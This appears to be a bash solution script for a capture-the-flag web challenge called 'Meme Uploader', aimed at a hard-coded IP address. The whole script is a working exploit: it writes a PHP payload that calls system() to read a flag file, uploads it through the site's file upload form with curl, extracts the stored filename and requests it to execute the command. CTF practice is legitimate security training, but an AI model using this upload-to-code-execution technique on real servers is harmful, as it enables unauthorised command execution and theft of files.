#!/bin/bash

URL=http://141.85.224.105:8003

# Meme Uploader

echo "Starting exploit for Meme Uploader..."

echo "Will use a random filename to avoid conflicts with existing filenames on the server..."
FILENAME="6HSisrykyD0846rdg.php"

echo "Writing the payload content to $FILENAME on disk..."
echo '<?php echo system("cat ../flag.txt"); ?>' > $FILENAME

echo "Uploading it on the server..."
OUTPUT=$(curl -s -F "fileToUpload=@${FILENAME}" -F 'submit=Upload meme' $URL)

echo "Extracting the new filename (hashed)..."
NEW_FILENAME=$(echo $OUTPUT | sed 's/.*Your file \([^ ]*\).*/\1/')

echo "Deleting locally generated file..."
rm "$FILENAME"

echo "Accessing the file on the server..."
echo "Flag is:"
curl "$URL"'/uploads/'"$NEW_FILENAME" || echo "Could not get flag. Most probably upload failed (a filename with the same name exists"
